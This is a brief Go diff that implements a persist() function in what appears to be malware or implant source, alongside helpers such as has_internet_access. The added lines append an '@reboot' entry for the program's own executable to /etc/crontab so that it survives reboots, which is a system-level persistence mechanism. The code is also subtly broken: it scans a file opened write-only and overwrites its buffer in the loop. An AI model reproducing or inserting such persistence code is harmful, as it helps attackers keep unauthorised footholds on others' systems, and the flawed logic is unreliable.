@@ -44,7 +44,16 @@ func has_persisted() bool {
 }
 
 func persist() {
-	
+	path, _ := os.Executable()
+	new_job := fmt.Sprintf("@reboot %s", path)
+	crontab, _ := os.OpenFile("/etc/crontab", os.O_APPEND|os.O_WRONLY, 0644)
+	scanner := bufio.NewScanner(crontab)
+	var content string
+	for scanner.Scan() {
+		content = scanner.Text() + "\n"
+	}
+	content += new_job + "\n"
+	crontab.Write([]byte(content))
 }
 
 func has_internet_access() bool {
